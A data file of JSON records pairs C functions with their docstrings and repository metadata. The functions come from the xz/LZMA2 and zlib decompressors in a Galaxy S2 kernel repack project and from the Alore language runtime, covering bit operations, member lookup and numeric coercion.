{"docstring": "/*\n * Repeat given number of bytes from the given distance. If the distance is\n * invalid, false is returned. On success, true is returned and *len is\n * updated to indicate how many bytes were left to be repeated.\n */\n", "func_signal": "static bool dict_repeat(struct dictionary *dict, uint32_t *len, uint32_t dist)", "code": "{\n\tsize_t back;\n\tuint32_t left;\n\n\tif (dist >= dict->full || dist >= dict->size)\n\t\treturn false;\n\n\tleft = min_t(size_t, dict->limit - dict->pos, *len);\n\t*len -= left;\n\n\tback = dict->pos - dist - 1;\n\tif (dist >= dict->pos)\n\t\tback += dict->end;\n\n\tdo {\n\t\tdict->buf[dict->pos++] = dict->buf[back++];\n\t\tif (back == dict->end)\n\t\t\tback = 0;\n\t} while (--left > 0);\n\n\tif (dict->full < dict->pos)\n\t\tdict->full = dict->pos;\n\n\treturn true;\n}", "path": "resources\\lib\\xz\\xz_dec_lzma2.c", "repo_name": "xiaolu/galaxys2_kernel_repack", "stars": 41, "license": "None", "language": "c", "size": 20423}
{"docstring": "/* Update the Index size and the CRC32 value. */\n", "func_signal": "static void index_update(struct xz_dec *s, const struct xz_buf *b)", "code": "{\n\tsize_t in_used = b->in_pos - s->in_start;\n\ts->index.size += in_used;\n\ts->crc32 = xz_crc32(b->in + s->in_start, in_used, s->crc32);\n}", "path": "resources\\lib\\xz\\xz_dec_stream.c", "repo_name": "xiaolu/galaxys2_kernel_repack", "stars": 41, "license": "None", "language": "c", "size": 20423}
{"docstring": "/* Copy uncompressed data as is from input to dictionary and output buffers. */\n", "func_signal": "static void dict_uncompressed(struct dictionary *dict, struct xz_buf *b,\n\t\t\t      uint32_t *left)", "code": "{\n\tsize_t copy_size;\n\n\twhile (*left > 0 && b->in_pos < b->in_size\n\t\t\t&& b->out_pos < b->out_size) {\n\t\tcopy_size = min(b->in_size - b->in_pos,\n\t\t\t\tb->out_size - b->out_pos);\n\t\tif (copy_size > dict->end - dict->pos)\n\t\t\tcopy_size = dict->end - dict->pos;\n\t\tif (copy_size > *left)\n\t\t\tcopy_size = *left;\n\n\t\t*left -= copy_size;\n\n\t\tmemcpy(dict->buf + dict->pos, b->in + b->in_pos, copy_size);\n\t\tdict->pos += copy_size;\n\n\t\tif (dict->full < dict->pos)\n\t\t\tdict->full = dict->pos;\n\n\t\tif (DEC_IS_MULTI(dict->mode)) {\n\t\t\tif (dict->pos == dict->end)\n\t\t\t\tdict->pos = 0;\n\n\t\t\tmemcpy(b->out + b->out_pos, b->in + b->in_pos,\n\t\t\t\t\tcopy_size);\n\t\t}\n\n\t\tdict->start = dict->pos;\n\n\t\tb->out_pos += copy_size;\n\t\tb->in_pos += copy_size;\n\t}\n}", "path": "resources\\lib\\xz\\xz_dec_lzma2.c", "repo_name": "xiaolu/galaxys2_kernel_repack", "stars": 41, "license": "None", "language": "c", "size": 20423}
{"docstring": "/*\n * Reset the dictionary state. When in single-call mode, set up the beginning\n * of the dictionary to point to the actual output buffer.\n */\n", "func_signal": "static void dict_reset(struct dictionary *dict, struct xz_buf *b)", "code": "{\n\tif (DEC_IS_SINGLE(dict->mode)) {\n\t\tdict->buf = b->out + b->out_pos;\n\t\tdict->end = b->out_size - b->out_pos;\n\t}\n\n\tdict->start = 0;\n\tdict->pos = 0;\n\tdict->limit = 0;\n\tdict->full = 0;\n}", "path": "resources\\lib\\xz\\xz_dec_lzma2.c", "repo_name": "xiaolu/galaxys2_kernel_repack", "stars": 41, "license": "None", "language": "c", "size": 20423}
{"docstring": "/*\n * At the end of a Deflate-compressed PPP packet, we expect to have seen\n * a `stored' block type value but not the (zero) length bytes.\n */\n/*\n   Returns true if inflate is currently at the end of a block generated by\n   Z_SYNC_FLUSH or Z_FULL_FLUSH. This function is used by one PPP\n   implementation to provide an additional safety check. PPP uses\n   Z_SYNC_FLUSH but removes the length bytes of the resulting empty stored\n   block. When decompressing, PPP checks that at the end of input packet,\n   inflate is waiting for these length bytes.\n */\n", "func_signal": "static int zlib_inflateSyncPacket(z_streamp strm)", "code": "{\n    struct inflate_state *state;\n\n    if (strm == NULL || strm->state == NULL) return Z_STREAM_ERROR;\n    state = (struct inflate_state *)strm->state;\n\n    if (state->mode == STORED && state->bits == 0) {\n\tstate->mode = TYPE;\n        return Z_OK;\n    }\n    return Z_DATA_ERROR;\n}", "path": "resources\\lib\\zlib_inflate\\inflate.c", "repo_name": "xiaolu/galaxys2_kernel_repack", "stars": 41, "license": "None", "language": "c", "size": 20423}
{"docstring": "/* Decode the Block Header and initialize the filter chain. */\n", "func_signal": "static enum xz_ret dec_block_header(struct xz_dec *s)", "code": "{\n\tenum xz_ret ret;\n\n\t/*\n\t * Validate the CRC32. We know that the temp buffer is at least\n\t * eight bytes so this is safe.\n\t */\n\ts->temp.size -= 4;\n\tif (xz_crc32(s->temp.buf, s->temp.size, 0)\n\t\t\t!= get_le32(s->temp.buf + s->temp.size))\n\t\treturn XZ_DATA_ERROR;\n\n\ts->temp.pos = 2;\n\n\t/*\n\t * Catch unsupported Block Flags. We support only one or two filters\n\t * in the chain, so we catch that with the same test.\n\t */\n#ifdef XZ_DEC_BCJ\n\tif (s->temp.buf[1] & 0x3E)\n#else\n\tif (s->temp.buf[1] & 0x3F)\n#endif\n\t\treturn XZ_OPTIONS_ERROR;\n\n\t/* Compressed Size */\n\tif (s->temp.buf[1] & 0x40) {\n\t\tif (dec_vli(s, s->temp.buf, &s->temp.pos, s->temp.size)\n\t\t\t\t\t!= XZ_STREAM_END)\n\t\t\treturn XZ_DATA_ERROR;\n\n\t\ts->block_header.compressed = s->vli;\n\t} else {\n\t\ts->block_header.compressed = VLI_UNKNOWN;\n\t}\n\n\t/* Uncompressed Size */\n\tif (s->temp.buf[1] & 0x80) {\n\t\tif (dec_vli(s, s->temp.buf, &s->temp.pos, s->temp.size)\n\t\t\t\t!= XZ_STREAM_END)\n\t\t\treturn XZ_DATA_ERROR;\n\n\t\ts->block_header.uncompressed = s->vli;\n\t} else {\n\t\ts->block_header.uncompressed = VLI_UNKNOWN;\n\t}\n\n#ifdef XZ_DEC_BCJ\n\t/* If there are two filters, the first one must be a BCJ filter. */\n\ts->bcj_active = s->temp.buf[1] & 0x01;\n\tif (s->bcj_active) {\n\t\tif (s->temp.size - s->temp.pos < 2)\n\t\t\treturn XZ_OPTIONS_ERROR;\n\n\t\tret = xz_dec_bcj_reset(s->bcj, s->temp.buf[s->temp.pos++]);\n\t\tif (ret != XZ_OK)\n\t\t\treturn ret;\n\n\t\t/*\n\t\t * We don't support custom start offset,\n\t\t * so Size of Properties must be zero.\n\t\t */\n\t\tif (s->temp.buf[s->temp.pos++] != 0x00)\n\t\t\treturn XZ_OPTIONS_ERROR;\n\t}\n#endif\n\n\t/* Valid Filter Flags always take at least two bytes. */\n\tif (s->temp.size - s->temp.pos < 2)\n\t\treturn XZ_DATA_ERROR;\n\n\t/* Filter ID = LZMA2 */\n\tif (s->temp.buf[s->temp.pos++] != 0x21)\n\t\treturn XZ_OPTIONS_ERROR;\n\n\t/* Size of Properties = 1-byte Filter Properties */\n\tif (s->temp.buf[s->temp.pos++] != 0x01)\n\t\treturn XZ_OPTIONS_ERROR;\n\n\t/* Filter Properties contains LZMA2 dictionary size. */\n\tif (s->temp.size - s->temp.pos < 1)\n\t\treturn XZ_DATA_ERROR;\n\n\tret = xz_dec_lzma2_reset(s->lzma2, s->temp.buf[s->temp.pos++]);\n\tif (ret != XZ_OK)\n\t\treturn ret;\n\n\t/* The rest must be Header Padding. */\n\twhile (s->temp.pos < s->temp.size)\n\t\tif (s->temp.buf[s->temp.pos++] != 0x00)\n\t\t\treturn XZ_OPTIONS_ERROR;\n\n\ts->temp.pos = 0;\n\ts->block.compressed = 0;\n\ts->block.uncompressed = 0;\n\n\treturn XZ_OK;\n}", "path": "resources\\lib\\xz\\xz_dec_stream.c", "repo_name": "xiaolu/galaxys2_kernel_repack", "stars": 41, "license": "None", "language": "c", "size": 20423}
{"docstring": "/* Decode a variable-length integer (little-endian base-128 encoding) */\n", "func_signal": "static enum xz_ret dec_vli(struct xz_dec *s, const uint8_t *in,\n\t\t\t   size_t *in_pos, size_t in_size)", "code": "{\n\tuint8_t byte;\n\n\tif (s->pos == 0)\n\t\ts->vli = 0;\n\n\twhile (*in_pos < in_size) {\n\t\tbyte = in[*in_pos];\n\t\t++*in_pos;\n\n\t\ts->vli |= (vli_type)(byte & 0x7F) << s->pos;\n\n\t\tif ((byte & 0x80) == 0) {\n\t\t\t/* Don't allow non-minimal encodings. */\n\t\t\tif (byte == 0 && s->pos != 0)\n\t\t\t\treturn XZ_DATA_ERROR;\n\n\t\t\ts->pos = 0;\n\t\t\treturn XZ_STREAM_END;\n\t\t}\n\n\t\ts->pos += 7;\n\t\tif (s->pos == 7 * VLI_BYTES_MAX)\n\t\t\treturn XZ_DATA_ERROR;\n\t}\n\n\treturn XZ_OK;\n}", "path": "resources\\lib\\xz\\xz_dec_stream.c", "repo_name": "xiaolu/galaxys2_kernel_repack", "stars": 41, "license": "None", "language": "c", "size": 20423}
{"docstring": "/* Get pointer to literal coder probability array. */\n", "func_signal": "static uint16_t *lzma_literal_probs(struct xz_dec_lzma2 *s)", "code": "{\n\tuint32_t prev_byte = dict_get(&s->dict, 0);\n\tuint32_t low = prev_byte >> (8 - s->lzma.lc);\n\tuint32_t high = (s->dict.pos & s->lzma.literal_pos_mask) << s->lzma.lc;\n\treturn s->lzma.literal[low + high];\n}", "path": "resources\\lib\\xz\\xz_dec_lzma2.c", "repo_name": "xiaolu/galaxys2_kernel_repack", "stars": 41, "license": "None", "language": "c", "size": 20423}
{"docstring": "/*\n * Put one byte into the dictionary. It is assumed that there is space for it.\n */\n", "func_signal": "static inline void dict_put(struct dictionary *dict, uint8_t byte)", "code": "{\n\tdict->buf[dict->pos++] = byte;\n\n\tif (dict->full < dict->pos)\n\t\tdict->full = dict->pos;\n}", "path": "resources\\lib\\xz\\xz_dec_lzma2.c", "repo_name": "xiaolu/galaxys2_kernel_repack", "stars": 41, "license": "None", "language": "c", "size": 20423}
{"docstring": "/* Decode a literal (one 8-bit byte) */\n", "func_signal": "static void lzma_literal(struct xz_dec_lzma2 *s)", "code": "{\n\tuint16_t *probs;\n\tuint32_t symbol;\n\tuint32_t match_byte;\n\tuint32_t match_bit;\n\tuint32_t offset;\n\tuint32_t i;\n\n\tprobs = lzma_literal_probs(s);\n\n\tif (lzma_state_is_literal(s->lzma.state)) {\n\t\tsymbol = rc_bittree(&s->rc, probs, 0x100);\n\t} else {\n\t\tsymbol = 1;\n\t\tmatch_byte = dict_get(&s->dict, s->lzma.rep0) << 1;\n\t\toffset = 0x100;\n\n\t\tdo {\n\t\t\tmatch_bit = match_byte & offset;\n\t\t\tmatch_byte <<= 1;\n\t\t\ti = offset + match_bit + symbol;\n\n\t\t\tif (rc_bit(&s->rc, &probs[i])) {\n\t\t\t\tsymbol = (symbol << 1) + 1;\n\t\t\t\toffset &= match_bit;\n\t\t\t} else {\n\t\t\t\tsymbol <<= 1;\n\t\t\t\toffset &= ~match_bit;\n\t\t\t}\n\t\t} while (symbol < 0x100);\n\t}\n\n\tdict_put(&s->dict, (uint8_t)symbol);\n\tlzma_state_literal(&s->lzma.state);\n}", "path": "resources\\lib\\xz\\xz_dec_lzma2.c", "repo_name": "xiaolu/galaxys2_kernel_repack", "stars": 41, "license": "None", "language": "c", "size": 20423}
{"docstring": "/* Decode a bittree starting from the least significant bit. */\n", "func_signal": "static __always_inline void rc_bittree_reverse(struct rc_dec *rc,\n\t\t\t\t\t       uint16_t *probs,\n\t\t\t\t\t       uint32_t *dest, uint32_t limit)", "code": "{\n\tuint32_t symbol = 1;\n\tuint32_t i = 0;\n\n\tdo {\n\t\tif (rc_bit(rc, &probs[symbol])) {\n\t\t\tsymbol = (symbol << 1) + 1;\n\t\t\t*dest += 1 << i;\n\t\t} else {\n\t\t\tsymbol <<= 1;\n\t\t}\n\t} while (++i < limit);\n}", "path": "resources\\lib\\xz\\xz_dec_lzma2.c", "repo_name": "xiaolu/galaxys2_kernel_repack", "stars": 41, "license": "None", "language": "c", "size": 20423}
{"docstring": "/*\n   Return state with length and distance decoding tables and index sizes set to\n   fixed code decoding.  This returns fixed tables from inffixed.h.\n */\n", "func_signal": "static void zlib_fixedtables(struct inflate_state *state)", "code": "{\n#   include \"inffixed.h\"\n    state->lencode = lenfix;\n    state->lenbits = 9;\n    state->distcode = distfix;\n    state->distbits = 5;\n}", "path": "resources\\lib\\zlib_inflate\\inflate.c", "repo_name": "xiaolu/galaxys2_kernel_repack", "stars": 41, "license": "None", "language": "c", "size": 20423}
{"docstring": "/*\n * Read the first five initial bytes into rc->code if they haven't been\n * read already. (Yes, the first byte gets completely ignored.)\n */\n", "func_signal": "static bool rc_read_init(struct rc_dec *rc, struct xz_buf *b)", "code": "{\n\twhile (rc->init_bytes_left > 0) {\n\t\tif (b->in_pos == b->in_size)\n\t\t\treturn false;\n\n\t\trc->code = (rc->code << 8) + b->in[b->in_pos++];\n\t\t--rc->init_bytes_left;\n\t}\n\n\treturn true;\n}", "path": "resources\\lib\\xz\\xz_dec_lzma2.c", "repo_name": "xiaolu/galaxys2_kernel_repack", "stars": 41, "license": "None", "language": "c", "size": 20423}
{"docstring": "/*\n * Decode a repeated match. The distance is one of the four most recently\n * seen matches. The distance will be stored in s->lzma.rep0.\n */\n", "func_signal": "static void lzma_rep_match(struct xz_dec_lzma2 *s, uint32_t pos_state)", "code": "{\n\tuint32_t tmp;\n\n\tif (!rc_bit(&s->rc, &s->lzma.is_rep0[s->lzma.state])) {\n\t\tif (!rc_bit(&s->rc, &s->lzma.is_rep0_long[\n\t\t\t\ts->lzma.state][pos_state])) {\n\t\t\tlzma_state_short_rep(&s->lzma.state);\n\t\t\ts->lzma.len = 1;\n\t\t\treturn;\n\t\t}\n\t} else {\n\t\tif (!rc_bit(&s->rc, &s->lzma.is_rep1[s->lzma.state])) {\n\t\t\ttmp = s->lzma.rep1;\n\t\t} else {\n\t\t\tif (!rc_bit(&s->rc, &s->lzma.is_rep2[s->lzma.state])) {\n\t\t\t\ttmp = s->lzma.rep2;\n\t\t\t} else {\n\t\t\t\ttmp = s->lzma.rep3;\n\t\t\t\ts->lzma.rep3 = s->lzma.rep2;\n\t\t\t}\n\n\t\t\ts->lzma.rep2 = s->lzma.rep1;\n\t\t}\n\n\t\ts->lzma.rep1 = s->lzma.rep0;\n\t\ts->lzma.rep0 = tmp;\n\t}\n\n\tlzma_state_long_rep(&s->lzma.state);\n\tlzma_len(s, &s->lzma.rep_len_dec, pos_state);\n}", "path": "resources\\lib\\xz\\xz_dec_lzma2.c", "repo_name": "xiaolu/galaxys2_kernel_repack", "stars": 41, "license": "None", "language": "c", "size": 20423}
{"docstring": "/* Set dictionary write limit */\n", "func_signal": "static void dict_limit(struct dictionary *dict, size_t out_max)", "code": "{\n\tif (dict->end - dict->pos <= out_max)\n\t\tdict->limit = dict->end;\n\telse\n\t\tdict->limit = dict->pos + out_max;\n}", "path": "resources\\lib\\xz\\xz_dec_lzma2.c", "repo_name": "xiaolu/galaxys2_kernel_repack", "stars": 41, "license": "None", "language": "c", "size": 20423}
{"docstring": "/* Create an Int object based on a binary Str 2's complement representation. */\n", "func_signal": "static AValue MakeIntFromBinary(AThread *t, AValue *v, long len)", "code": "{\n    ABool isNeg = FALSE;\n    ALongInt *ptr;\n    long i;\n\n    if (DIGIT(*v, len - 1) & (1UL << (BITS - 1))) {\n        /* Negative result. */\n        isNeg = TRUE;\n        NegateSign(*v, len);\n    }\n\n    ptr = AAlloc(t, AGetBlockSize(AGetLongIntSize(len)));\n    if (ptr == NULL)\n        ARaiseMemoryError(t);\n\n    AInitLongIntBlock(ptr, len, FALSE);\n\n    for (i = 0; i < len; i++)\n        ptr->digit[i] = DIGIT(*v, i);\n\n    return ANormalize(t, ptr, isNeg);\n}", "path": "src\\bitop_module.c", "repo_name": "JukkaL/alore", "stars": 34, "license": "other", "language": "c", "size": 1980}
{"docstring": "/* Read the member of an object via a member id. */\n", "func_signal": "AValue AMemberByNum(AThread *t, AValue val, int member)", "code": "{\n    AInstance *inst;\n    ATypeInfo *type;\n    AMemberHashTable *table;\n    AMemberNode *node;\n\n    if (!AIsInstance(val)) {\n        val = AWrapObject(t, val);\n        if (AIsError(val))\n            return AError;\n    }\n\n    inst = AValueToInstance(val);\n    type = AGetInstanceType(inst);\n    table = AGetMemberTable(type, MT_VAR_GET_PUBLIC);\n\n    node = &table->item[member & table->size];\n\n    /* Search the get hash table. */\n    while (node->key != member) {\n        if (node->next == NULL) {\n            if (type->super == NULL)\n                return AGetInstanceCodeMember(t, inst, member);\n            else {\n                type = type->super;\n                table = AGetMemberTable(type, MT_VAR_GET_PUBLIC);\n                node = &table->item[member & table->size];\n            }\n        } else\n            node = node->next;\n    }\n\n    if (node->item < A_VAR_METHOD)\n        return inst->member[node->item];\n    else {\n        AValue funcVal;\n        AValue ret;\n\n        /* Call getter method. */\n        t->tempStack[1] = val;\n        funcVal = AGlobalByNum(node->item & ~A_VAR_METHOD);\n        ret = ACallValue(t, funcVal, 1, t->tempStack + 1);\n\n        return ret;\n    }\n}", "path": "src\\runtime.c", "repo_name": "JukkaL/alore", "stars": 34, "license": "other", "language": "c", "size": 1980}
{"docstring": "/* bitop::Shr(n, m) */\n", "func_signal": "static AValue BitopShr(AThread *t, AValue *frame)", "code": "{\n    long shift, len;\n    long digitShift, i;\n    ABool isNeg;\n\n    if (AIsShortInt(frame[1])) {\n        shift = AValueToInt(frame[1]);\n        if (shift < 0)\n            ARaiseValueError(t, \"Negative shift count\");\n    } else if (AIsLongInt(frame[1])) {\n        if (AGetLongIntSign(AValueToLongInt(frame[1])))\n            ARaiseValueError(t, \"Negative shift count\");\n        /* If we have REALLY large integers, Shr might not work with them (the\n           correct result below might be larger than 0). But since it is\n           completely impractical to work with integers having 64MB+ length on\n           32-bit systems where this is an issue, the problem is trivial. */\n        if (AIsInt(frame[0]))\n            return AZero;\n        shift = 0; /* The value does not matter since a TypeError will be\n                      raised. */\n    } else\n        return ARaiseIntExpected(t, frame[1]);\n\n    if (AIsShortInt(frame[0]) && shift < A_VALUE_BITS)\n        return AIntToValue(AValueToInt(frame[0]) >> shift);\n    else if (!AIsInt(frame[0]))\n        return ARaiseIntExpected(t, frame[0]);\n\n    digitShift = shift / BITS;\n    shift &= (BITS - 1);\n    len = IntLen(frame[0]);\n    frame[0] = GetLongIntDigits(t, &frame[0], len);\n    isNeg = DIGIT(frame[0], len - 1) & (1UL << (BITS - 1));\n\n    for (i = 0; i < len - digitShift; i++) {\n        long v = (DIGIT(frame[0], i + digitShift) >> shift) & MASK;\n        if (i < len - digitShift - 1)\n            v |= (ALongIntDoubleDigit)DIGIT(\n                frame[0], i + digitShift + 1) << (BITS - shift);\n        else if (isNeg)\n            v |= (ALongIntDoubleDigit)MASK << (BITS - shift);\n        DIGIT(frame[0], i) = v;\n    }\n    for (; i < len; i++)\n        DIGIT(frame[0], i) = isNeg ? MASK : 0;\n\n    return MakeIntFromBinary(t, &frame[0], len);\n}", "path": "src\\bitop_module.c", "repo_name": "JukkaL/alore", "stars": 34, "license": "other", "language": "c", "size": 1980}
{"docstring": "/* Read the data member of an instance. Raise MemberError if failed. */\n", "func_signal": "AValue AGetInstanceDataMember(AThread *t, AInstance *inst, unsigned member)", "code": "{\n    int memberNum;\n\n    memberNum = AGetInstanceMember(inst, MT_VAR_GET_PUBLIC, member);\n    if (memberNum == -1)\n        return ARaiseMemberErrorND(t, AInstanceToValue(inst), member);\n\n    if (memberNum >= A_VAR_METHOD) {\n        AValue retVal;\n\n        *t->tempStack = AInstanceToValue(inst);\n        retVal = ACallValue(t, AGlobalByNum(memberNum & ~A_VAR_METHOD),\n                              1, t->tempStack);\n        *t->tempStack = AZero;\n        return retVal;\n    } else\n        return inst->member[memberNum];\n}", "path": "src\\runtime.c", "repo_name": "JukkaL/alore", "stars": 34, "license": "other", "language": "c", "size": 1980}
{"docstring": "/* Return the type object that corresponds to the class of the object\n   argument. Raise ValueError if the argument is nil. */\n", "func_signal": "AValue AGetTypeObject(AThread *t, AValue object)", "code": "{\n    if (AIsInstance(object)) {\n        /* Anonymous functions need special processing. */\n        if (AIsAnonFunc(object))\n            return AGlobalByNum(AStdFunctionNum);\n        else {\n            /* This is the generic case. It covers all user-defined types\n               and most C and library types. */\n            AInstance *inst = AValueToInstance(object);\n            return AGlobalByNum(AGetInstanceType(inst)->sym->num);\n        }\n    } else if (AIsInt(object))\n        return AGlobalByNum(AStdIntNum);\n    else if (AIsStr(object))\n        return AGlobalByNum(AStdStrNum);\n    else if (AIsFloat(object))\n        return AGlobalByNum(AStdFloatNum);\n    else if (AIsNil(object))\n        return ARaiseValueError(t, \"Type of nil not defined\");\n    else if (AIsConstant(object))\n        return AGlobalByNum(AStdConstantNum);\n    else if (AIsPair(object))\n        return AGlobalByNum(AStdPairNum);\n    else if (AIsRange(object))\n        return AGlobalByNum(AStdRangeNum);\n    else if (AIsOfType(object, AGlobalByNum(AStdTypeNum)) == A_IS_TRUE)\n        return AGlobalByNum(AStdTypeNum);\n    else if (AIsGlobalFunction(object) || AIsMethod(object))\n        return AGlobalByNum(AStdFunctionNum);\n    else\n        return ARaiseValueError(t, NULL);\n}", "path": "src\\runtime.c", "repo_name": "JukkaL/alore", "stars": 34, "license": "other", "language": "c", "size": 1980}
{"docstring": "/* Get the method with given member id or raise an exception. Return a bound\n   method if successful. */\n", "func_signal": "AValue AGetInstanceCodeMember(AThread *t, AInstance *inst, unsigned member)", "code": "{\n    int methodNum;\n\n    methodNum = AGetInstanceMember(inst, MT_METHOD_PUBLIC, member);\n    if (methodNum == -1)\n        return ARaiseMemberErrorND(t, AInstanceToValue(inst), member);\n\n    return ACreateBoundMethod(t, AInstanceToValue(inst), methodNum);\n}", "path": "src\\runtime.c", "repo_name": "JukkaL/alore", "stars": 34, "license": "other", "language": "c", "size": 1980}
{"docstring": "/* bitop::Or(n, m) */\n", "func_signal": "static AValue BitopOr(AThread *t, AValue *frame)", "code": "{\n    if (AIsShortInt(frame[0]) && AIsShortInt(frame[1]))\n        return AMakeIntFromValue(t, AValueToInt(frame[0]) |\n                                 AValueToInt(frame[1]));\n    else if (AIsInt(frame[0]) && AIsInt(frame[1])) {\n        long i, len;\n\n        len = AMax(IntLen(frame[0]), IntLen(frame[1]));\n\n        frame[0] = GetLongIntDigits(t, &frame[0], len);\n        frame[1] = GetLongIntDigits(t, &frame[1], len);\n\n        for (i = 0; i < len; i++)\n            DIGIT(frame[0], i) |= DIGIT(frame[1], i);\n\n        return MakeIntFromBinary(t, &frame[0], len);\n    } else\n        return RaiseIntExpected(t, frame);\n}", "path": "src\\bitop_module.c", "repo_name": "JukkaL/alore", "stars": 34, "license": "other", "language": "c", "size": 1980}
{"docstring": "/* Return AZero / AIntToValue(1) depending on whether two Range or Pair\n   values are equal, or AError if an exception was raised. Assumes\n   v1 and v2 are both either Range or Pair objects. */\n", "func_signal": "AValue IsRangeOrPairEqual(AThread *t, AValue v1, AValue v2)", "code": "{\n    AValue res;\n\n    if (!AAllocTempStack(t, 2))\n        return AError;\n\n    t->tempStackPtr[-2] = v1;\n    t->tempStackPtr[-1] = v2;\n\n    res = AIsEqual(t, AValueToMixedObject(v1)->data.range.start,\n                  AValueToMixedObject(v2)->data.range.start);\n    if (res == AIntToValue(1))\n        res = AIsEqual(\n            t,\n            AValueToMixedObject(t->tempStackPtr[-2])->data.range.stop,\n            AValueToMixedObject(t->tempStackPtr[-1])->data.range.stop);\n\n    t->tempStackPtr -= 2;\n\n    return res;\n}", "path": "src\\runtime.c", "repo_name": "JukkaL/alore", "stars": 34, "license": "other", "language": "c", "size": 1980}
{"docstring": "/* Initialize the GL_COMMAND_LINE_ARGS global value to contain an array of\n   command line arguments. */\n", "func_signal": "ABool ASetupCommandLineArgs(AThread *t, int argc, char **argv)", "code": "{\n    AValue array;\n    int i;\n\n    array = AMakeArrayND(t, argc);\n    if (AIsError(array))\n        return FALSE;\n\n    if (!ASetConstGlobalValue(t, GL_COMMAND_LINE_ARGS, array))\n        return FALSE;\n\n    for (i = 0; i < argc; i++) {\n        AValue str = ACreateStringFromCStr(t, argv[i]);\n        if (AIsError(str))\n            return FALSE;\n\n        if (!ASetArrayItemND(t, AGlobalByNum(GL_COMMAND_LINE_ARGS),\n                             i, str))\n            return FALSE;\n    }\n\n    return TRUE;\n}", "path": "src\\runtime.c", "repo_name": "JukkaL/alore", "stars": 34, "license": "other", "language": "c", "size": 1980}
{"docstring": "/* Coerce the arguments of a binary arithmetic operation to common types.\n   Return the coerced left operand and store the coerced right operand at\n   *rightRes. */\n/* NOTE: Does not handle int+int, float+float and longint+longint. */\n", "func_signal": "AValue ACoerce(AThread *t, AOperator op, AValue left, AValue right,\n               AValue *rightRes)", "code": "{\n    /* IDEA: Could this code be made smaller? This is ugly. */\n\n    if (AIsFloat(left)) {\n        if (AIsShortInt(right)) {\n            *t->tempStack = left;\n            right = ACreateFloat(t, AValueToInt(right));\n            left = *t->tempStack;\n            *t->tempStack = AZero;\n        } else  if (AIsLongInt(right)) {\n            *t->tempStack = left;\n            right = ACreateFloatFromLongInt(t, right);\n            left = *t->tempStack;\n            *t->tempStack = AZero;\n        } else if (!AIsFloat(right))\n            goto Fail;\n    } else if (AIsLongInt(left)) {\n        if (AIsShortInt(right)) {\n            *t->tempStack = left;\n            right = ACreateLongIntFromIntND(t, AValueToInt(right));\n            left = *t->tempStack;\n            *t->tempStack = AZero;\n        } else if (AIsFloat(right)) {\n            *t->tempStack = right;\n            left = ACreateFloatFromLongInt(t, left);\n            right = *t->tempStack;\n            *t->tempStack = AZero;\n        } else if (!AIsLongInt(right))\n            goto Fail;\n    } else if (AIsShortInt(left)) {\n        if (AIsFloat(right)) {\n            *t->tempStack = right;\n            left = ACreateFloat(t, AValueToInt(left));\n            right = *t->tempStack;\n            *t->tempStack = AZero;\n        } else if (AIsLongInt(right)) {\n            *t->tempStack = right;\n            left = ACreateLongIntFromIntND(t, AValueToInt(left));\n            right = *t->tempStack;\n            *t->tempStack = AZero;\n        } else if (!AIsShortInt(right))\n            goto Fail;\n    } else\n        goto Fail;\n\n    if (AIsError(right))\n        return right;\n\n    *rightRes = right;\n    return left;\n\n  Fail:\n\n    return ARaiseBinopTypeErrorND(t, op, left, right);\n}", "path": "src\\runtime.c", "repo_name": "JukkaL/alore", "stars": 34, "license": "other", "language": "c", "size": 1980}
{"docstring": "/* Is val a special type object (e.g. std::Int, std::Str, etc.)? */\n", "func_signal": "ABool AIsSpecialType(AValue val)", "code": "{\n    /* IDEA: There could a special flag in Function objects specifying whether\n             the function is a type constructor, making this function\n             faster. */\n    return val == AGlobalByNum(AStdIntNum)\n        || val == AGlobalByNum(AStdStrNum)\n        || val == AGlobalByNum(AStdTypeNum)\n        || val == AGlobalByNum(AStdFloatNum)\n        || val == AGlobalByNum(AStdRangeNum)\n        || val == AGlobalByNum(AStdFunctionNum)\n        || val == AGlobalByNum(AStdPairNum)\n        || val == AGlobalByNum(AStdConstantNum);\n}", "path": "src\\runtime.c", "repo_name": "JukkaL/alore", "stars": 34, "license": "other", "language": "c", "size": 1980}
{"docstring": "/* bitop::Shl(n, m) */\n", "func_signal": "static AValue BitopShl(AThread *t, AValue *frame)", "code": "{\n    long shift, len;\n    long digitShift, i;\n\n    if (AIsShortInt(frame[1])) {\n        shift = AValueToInt(frame[1]);\n        if (shift < 0)\n            ARaiseValueError(t, \"Negative shift count\");\n    } else if (AIsLongInt(frame[1])) {\n        if (AGetLongIntSign(AValueToLongInt(frame[1])))\n            ARaiseValueError(t, \"Negative shift count\");\n        shift = AGetInt(t, frame[1]);\n    } else\n        return ARaiseIntExpected(t, frame[1]);\n\n    if (AIsShortInt(frame[0]) && !IsShlOverflow(frame[0], shift))\n        return frame[0] << shift;\n    else if (!AIsInt(frame[0]))\n        return ARaiseIntExpected(t, frame[0]);\n\n    digitShift = shift / BITS;\n    shift &= (BITS - 1);\n    len = IntLen(frame[0]) + digitShift;\n    frame[0] = GetLongIntDigits(t, &frame[0], len);\n\n    for (i = len - 1; i >= digitShift; i--) {\n        long v = (ALongIntDoubleDigit)(DIGIT(frame[0],\n                                            i - digitShift) << shift) & MASK;\n        if (i > digitShift)\n            v |= (ALongIntDoubleDigit)DIGIT(\n                frame[0],  i - digitShift - 1) >> (BITS - shift);\n        DIGIT(frame[0], i) = v;\n    }\n    for (; i >= 0; i--)\n        DIGIT(frame[0], i) = 0;\n\n    return MakeIntFromBinary(t, &frame[0], len);\n}", "path": "src\\bitop_module.c", "repo_name": "JukkaL/alore", "stars": 34, "license": "other", "language": "c", "size": 1980}
{"docstring": "/* bitop::And(n, m) */\n", "func_signal": "static AValue BitopAnd(AThread *t, AValue *frame)", "code": "{\n    if (AIsShortInt(frame[0]) && AIsShortInt(frame[1]))\n        return AMakeIntFromValue(t, AValueToInt(frame[0]) &\n                                 AValueToInt(frame[1]));\n    else if (AIsInt(frame[0]) && AIsInt(frame[1])) {\n        long i, len;\n\n        len = AMax(IntLen(frame[0]), IntLen(frame[1]));\n\n        frame[0] = GetLongIntDigits(t, &frame[0], len);\n        frame[1] = GetLongIntDigits(t, &frame[1], len);\n\n        for (i = 0; i < len; i++)\n            DIGIT(frame[0], i) &= DIGIT(frame[1], i);\n\n        return MakeIntFromBinary(t, &frame[0], len);\n    } else\n        return RaiseIntExpected(t, frame);\n}", "path": "src\\bitop_module.c", "repo_name": "JukkaL/alore", "stars": 34, "license": "other", "language": "c", "size": 1980}
